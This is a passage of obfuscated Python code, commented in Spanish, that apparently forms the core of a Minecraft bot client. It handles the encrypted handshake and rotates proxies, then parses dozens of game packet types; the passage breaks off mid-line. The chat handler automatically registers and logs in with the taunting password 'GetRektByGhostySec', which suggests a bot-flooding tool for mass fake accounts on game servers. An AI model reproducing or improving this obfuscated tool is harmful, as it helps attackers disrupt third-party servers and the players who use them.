                    O00O00OOOO00O0O00 =OO00O0OO0OOO0000O ._readString ()
                    OO00O0OO0OOO0000O ._log ('Desconectado! Razon - '+O00O00OOOO00O0O00 +'')
                    OO00O0OO0OOO0000O ._isConnected =False
                    try :
                        OO00O0OO0OOO0000O ._socket .close ()
                    except :
                        pass
                    return
                elif _O000O0O00000O0000 ==0x01 :
                    OO00O0OO0OOO0000O ._debug ('Encriptación en curso...')
                    OOO00O0O0O0000O0O =OO00O0OO0OOO0000O ._readString ()
                    syncprint (OOO00O0O0O0000O0O )
                    OO00000OO000000O0 =OO00O0OO0OOO0000O ._read_short_array ()
                    syncprint (OO00000OO000000O0 )
                    OO0000O00OOO000O0 =OO00O0OO0OOO0000O ._read_short_array ()
                    syncprint (OO0000O00OOO000O0 )
                    if OO00000OO000000O0 !='':
                        O0O0O0O00OO00OO0O =decode_public_key (OO00000OO000000O0 )
                        O0O0OOOO000000OO0 =generate_shared_secret ()
                        syncprint (O0O0OOOO000000OO0 )
                        OOO0O00OO0O00O000 =encrypt_with_public_key (OO0000O00OOO000O0 ,O0O0O0O00OO00OO0O )
                        OO0O00O00O0000O00 =encrypt_with_public_key (O0O0OOOO000000OO0 ,O0O0O0O00OO00OO0O )
                        O0OOO00O00O00OOO0 =make_server_hash (OOO00O0O0O0000O0O ,O0O0OOOO000000OO0 ,O0O0O0O00OO00OO0O ,)
                        join_server (OO00O0OO0OOO0000O ._session ,O0OOO00O00O00OOO0 )
                        OO00O0OO0OOO0000O ._SendEncrypt (OO0O00O00O0000O00 ,OOO0O00OO0O00O000 )
                        OO00O0OO0OOO0000O ._AES =generated_cipher (O0O0OOOO000000OO0 )
                    else :
                        OO00O0OO0OOO0000O ._SendEncrypt ('',OO0000O00OOO000O0 )
                elif _O000O0O00000O0000 ==0x02 :
                    ProxyManager .coolProxy (OO00O0OO0OOO0000O ._proxy )
                    OO00O0OO0OOO0000O ._debug (' - Handshake Establecido - ')
                    OO00O0OO0OOO0000O ._log ('Conectado!')
                    OO00O0OO0OOO0000O ._debug (OO00O0OO0OOO0000O ._readString ())
                    OO00O0OO0OOO0000O ._debug (OO00O0OO0OOO0000O ._readString ())
                    OO00O0OO0OOO0000O ._isConnected =True
                    OO00O0OO0OOO0000O .SendPacket ('\x15\x05\x65\x6e\x5f\x55\x53\x0c\x00\x01\x02\x01')
                    OO00O0OO0OOO0000O .SendPacket ('\x13\x17\x08\x4d\x43\x7c\x42\x72\x61\x6e\x64\x00\x07\x76\x61\x6e\x69\x6c\x6c\x61')
                elif _O000O0O00000O0000 ==0x03 :
                    OO00O0OO0OOO0000O ._debug ('Encriptando..')
                    OO00O0OO0OOO0000O ._threshold =OO00O0OO0OOO0000O ._readVarint ()
            else :
                if OO00O0OO0OOO0000O ._count ==0 :
                    OO00O0OO0OOO0000O ._action ()
                    OO00O0OO0OOO0000O ._count =10
                OO00O0OO0OOO0000O ._count =OO00O0OO0OOO0000O ._count -1
                if _O000O0O00000O0000 ==0x00 :
                    OO00O0OO0OOO0000O ._debug ('Haciendo PING')
                    OO00O0OO0OOO0000O .SendPacket (OO00O0OO0OOO0000O ._readVarint ())
                elif _O000O0O00000O0000 ==0x01 :
                    OO00O0OO0OOO0000O ._debug ('Conectado')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._readString ()
                elif _O000O0O00000O0000 ==0x02 :
                    OO00O0OO0OOO0000O ._debug ('Chat - ')
                    O000OOOOOOO0OO0O0 =OO00O0OO0OOO0000O ._readString ()
                    if OO00O0OO0OOO0000O ._printChat ==True :
                        OO00O0OO0OOO0000O ._log ('Chat - '+O000OOOOOOO0OO0O0)
                    else :
                        OO00O0OO0OOO0000O ._debug ('Chat - ' +O000OOOOOOO0OO0O0)
                    if OO00O0OO0OOO0000O ._loggedIn ==False :
                        if O000OOOOOOO0OO0O0 .find ('login')!=-1 :
                            OO00O0OO0OOO0000O ._log ('Iniciando sesión - '+O000OOOOOOO0OO0O0)
                            OO00O0OO0OOO0000O ._queuedMessages .append ('/login GetRektByGhostySec')
                            OO00O0OO0OOO0000O ._loggedIn =True
                        if O000OOOOOOO0OO0O0 .find ('register')!=-1 :
                            OO00O0OO0OOO0000O ._log ('Registrando! - '+O000OOOOOOO0OO0O0)
                            OO00O0OO0OOO0000O ._queuedMessages .append ('/register GetRektByGhostySec GetRektByGhostySec')
                            OO00O0OO0OOO0000O ._queuedMessages .append ('/register GetRektByGhostySec')
                            OO00O0OO0OOO0000O ._queuedMessages .append ('/setpassword GetRektByGhostySec')
                            OO00O0OO0OOO0000O ._queuedMessages .append ('/login GetRektByGhostySec')
                            OO00O0OO0OOO0000O ._loggedIn =True
                            OO00O0OO0OOO0000O ._log ('Done')
                elif _O000O0O00000O0000 ==0x03 :
                    OO00O0OO0OOO0000O ._debug ('Actualización - ')
                    OO00O0OO0OOO0000O ._getBytes (8 )
                    OO00O0OO0OOO0000O ._getBytes (8 )
                elif _O000O0O00000O0000 ==0x04 :
                    OO00O0OO0OOO0000O ._debug ('Armadura - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._readSlot ()
                elif _O000O0O00000O0000 ==0x05 :
                    OOOOOOO00O0000OOO =OO00O0OO0OOO0000O ._getBytes (4 )
                    OOO0000OOO0OOO0O0 =OO00O0OO0OOO0000O ._getBytes (4 )
                    OO0OOOO000OO000OO =OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._debug ('Coordenadas X:'+str (int (binascii .b2a_hex (OOOOOOO00O0000OOO ),16 ))+', Y:'+str (int (binascii .b2a_hex (OOO0000OOO0OOO0O0 ),16 ))+', Z:'+str (int (binascii .b2a_hex (OO0OOOO000OO000OO ),16 ))+'')
                elif _O000O0O00000O0000 ==0x06 :
                    OO00O0OO0OOO0000O ._debug ('Vida - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x07 :
                    OO00O0OO0OOO0000O ._debug ('Respawn - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._debug (OO00O0OO0OOO0000O ._readString ())
                elif _O000O0O00000O0000 ==0x08 :
                    OO00O0OO0OOO0000O ._debug ('Posición -')
                    OO00O0OO0OOO0000O ._getBytes (8 )
                    OO00O0OO0OOO0000O ._getBytes (8 )
                    OO00O0OO0OOO0000O ._getBytes (8 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x09 :
                    OO00O0OO0OOO0000O ._debug ('Item en uso - ')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x0A :
                    OO00O0OO0OOO0000O ._debug ('Cama - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x0B :
                    OO00O0OO0OOO0000O ._debug ('Animación - ')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x0C :
                    pass
                elif _O000O0O00000O0000 ==0x0D :
                    OO00O0OO0OOO0000O ._debug ('Recoger Item - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x0E :
                    OO00O0OO0OOO0000O ._debug ('Spawnear Item - ')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OOO000000O0O0OO00 ='Normal'
                    if OO00O0OO0OOO0000O ._getBytes (4 )!='\x00\x00\x00\x00':
                        OOO000000O0O0OO00 ='Projectile'
                        OO00O0OO0OOO0000O ._getBytes (2 )
                        OO00O0OO0OOO0000O ._getBytes (2 )
                        OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._debug ('Información ['+OOO000000O0O0OO00 +']')
                elif _O000O0O00000O0000 ==0x0F :
                    OO00O0OO0OOO0000O ._debug ('Spawn Mob')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._genMetadata ()
                elif _O000O0O00000O0000 ==0x10 :
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._debug ('Información ['+OO00O0OO0OOO0000O ._readString ()+']')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x11 :
                    OO00O0OO0OOO0000O ._debug (' Experiencia -')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                elif _O000O0O00000O0000 ==0x12 :
                    OO00O0OO0OOO0000O ._debug ('Velocidad - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                elif _O000O0O00000O0000 ==0x13 :
                    OO00O0OO0OOO0000O ._debug ('Destrozar Identidades')
                    O0OO00O00O000O00O =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (1 )),16 )
                    for OO00OOO000OOOO000 in range (O0OO00O00O000O00O ):
                        OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x14 :
                    OO00O0OO0OOO0000O ._debug ('Identidad')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x15 :
                    OO00O0OO0OOO0000O ._debug ('Movimiento de Identidad - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x16 :
                    OO00O0OO0OOO0000O ._debug ('Identidad - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x17 :
                    OO00O0OO0OOO0000O ._debug ('Identidad Posición - ')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x18 :
                    OO00O0OO0OOO0000O ._debug ('Entity Teleport')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x19 :
                    OO00O0OO0OOO0000O ._debug ('Entity Head Look')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x1A :
                    OO00O0OO0OOO0000O ._debug ('Entity Status')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 =="\x1B":
                    OO00O0OO0OOO0000O ._debug ('Attach Entity')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x1C :
                    OO00O0OO0OOO0000O ._debug ('Entity Metadata')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._genMetadata ()
                elif _O000O0O00000O0000 ==0x1D :
                    OO00O0OO0OOO0000O ._debug ('Entity Effect')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                elif _O000O0O00000O0000 ==0x1E :
                    OO00O0OO0OOO0000O ._debug ('Remove Entity Effect')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x1F :
                    OO00O0OO0OOO0000O ._debug ('Set Experience')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                elif _O000O0O00000O0000 ==0x20 :
                    OO00O0OO0OOO0000O ._debug ('Entity Properties')
                elif _O000O0O00000O0000 ==0x21 :
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OOOO0000O0O0O00OO =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (4 )),16 )
                    OO00O0OO0OOO0000O ._debug ('Chunk Update ['+str (OOOO0000O0O0O00OO )+']')
                    OO00O0OO0OOO0000O ._getBytes (OOOO0000O0O0O00OO )
                elif _O000O0O00000O0000 ==0x22 :
                    OO00O0OO0OOO0000O ._debug ('Multi Block Change')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO0000000O0000OO0 =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (4 )),16 )
                    OO00O0OO0OOO0000O ._getBytes (OO0000000O0000OO0 )
                elif _O000O0O00000O0000 ==0x23 :
                    OO00O0OO0OOO0000O ._debug ('Block Change')
                    pass
                elif _O000O0O00000O0000 ==0x24 :
                    OO00O0OO0OOO0000O ._debug ('Block Action')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._readVarint ()
                elif _O000O0O00000O0000 ==0x25 :
                    OO00O0OO0OOO0000O ._debug ('Block Break Animation')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x26 :
                    OO00O0OO0OOO0000O ._debug ('Map Chunk Bulk')
                elif _O000O0O00000O0000 ==0x27 :
                    OO00O0OO0OOO0000O ._debug ('Explosion')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OOOO0000O0O0O00OO =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (4 )),16 )
                    OO00O0OO0OOO0000O ._getBytes (OOOO0000O0O0O00OO *3 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x28 :
                    OO00O0OO0OOO0000O ._debug ('Effect')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x29 :
                    OO00O0OO0OOO0000O ._debug ('Named Sound Effect')
                    OO00O0OO0OOO0000O ._readString ()
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x2A :
                    OO00O0OO0OOO0000O ._debug ('New/Inval_packet State')
                    OO00O0OO0OOO0000O ._readString ()
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x2B :
                    OO00O0OO0OOO0000O ._debug ('Change Game State')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x2C :
                    OO00O0OO0OOO0000O ._debug ('Spawn Global Entity - thunderbolt')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x2D :
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    O00O00000OO00OO0O =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (1 )),16 )
                    OO00O0OO0OOO0000O ._debug ('Open window ['+OO00O0OO0OOO0000O ._readString ()+']')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    if O00O00000OO00OO0O ==1 :
                        OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x2E :
                    OO00O0OO0OOO0000O ._debug ('Close Window')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x2F :
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._debug ('Set Slot')
                    OO00O0OO0OOO0000O ._readSlot ()
                elif _O000O0O00000O0000 ==0x30 :
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._debug ('Window Items')
                    O00OOOO00OOOOOO00 =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (2 )),16 )
                    while O00OOOO00OOOOOO00 !=0 :
                        OO00O0OO0OOO0000O ._readSlot ()
                        O00OOOO00OOOOOO00 =O00OOOO00OOOOOO00 -1
                elif _O000O0O00000O0000 ==0x31 :
                    OO00O0OO0OOO0000O ._debug ('Window Property')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                elif _O000O0O00000O0000 ==0x32 :
                    OO00O0OO0OOO0000O ._debug ('Confirm Transaction')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                elif _O000O0O00000O0000 ==0x33 :
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OOOO0OO0O0O00OOOO =OO00O0OO0OOO0000O ._readString ()
                    OOO00O00O00OO0OO0 =OO00O0OO0OOO0000O ._readString ()
                    OO00OOO00O000OOOO =OO00O0OO0OOO0000O ._readString ()
                    OO0O00O0O000O0000 =OO00O0OO0OOO0000O ._readString ()
                    OO00O0OO0OOO0000O ._debug ('Update Sign ['+OOOO0OO0O0O00OOOO +':'+OOO00O00O00OO0OO0 +':'+OO00OOO00O000OOOO +':'+OO0O00O0O000O0000 +']')
                elif _O000O0O00000O0000 ==0x34 :
                    OO00O0OO0OOO0000O ._debug ('Maps')
                    OO00O0OO0OOO0000O ._readVarint ()
                    O0OO00O00O000O00O =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (2 )),16 )
                    OO00O0OO0OOO0000O ._getBytes (O0OO00O00O000O00O )
                elif _O000O0O00000O0000 ==0x35 :
                    OO00O0OO0OOO0000O ._debug ('Update Block Entity')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    O0OO00O00O000O00O =int (binascii .b2a_hex (OO00O0OO0OOO0000O ._getBytes (2 )),16 )
                    if O0OO00O00O000O00O >0 :
                        OO00O0OO0OOO0000O ._getBytes (O0OO00O00O000O00O )
                elif _O000O0O00000O0000 ==0x36 :
                    OO00O0OO0OOO0000O ._debug ('Sign Editor Open')
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x37 :
                    OO00O0OO0OOO0000O ._debug ('Increment Statistic')
                    O0OO00O00O000O00O =OO00O0OO0OOO0000O ._readVarint ()
                    for OO00OOO000OOOO000 in range (O0OO00O00O000O00O ):
                        OO00O0OO0OOO0000O ._readString ()
                        OO00O0OO0OOO0000O ._readVarint ()
                elif _O000O0O00000O0000 ==0x38 :
                    OO00O0OO0OOO0000O ._debug ('Player List Item ['+OO00O0OO0OOO0000O ._readString ()+']')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (2 )
                elif _O000O0O00000O0000 ==0x39 :
                    OO00O0OO0OOO0000O ._debug ('Player Abilities')
                    OO00O0OO0OOO0000O ._getBytes (1 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                    OO00O0OO0OOO0000O ._getBytes (4 )
                elif _O000O0O00000O0000 ==0x3A :
                    OO00O0OO0OOO0000O ._debug ('Tab-Complete')
                    OO00O0OO0OOO0000O ._readVarint ()
                    OO00O0OO0OOO0000O ._readString ()
                elif _O000O0O00000O0000 ==0x3B :
                    OO00O0OO0OOO0000O ._debug ('Scoreboard Objecti
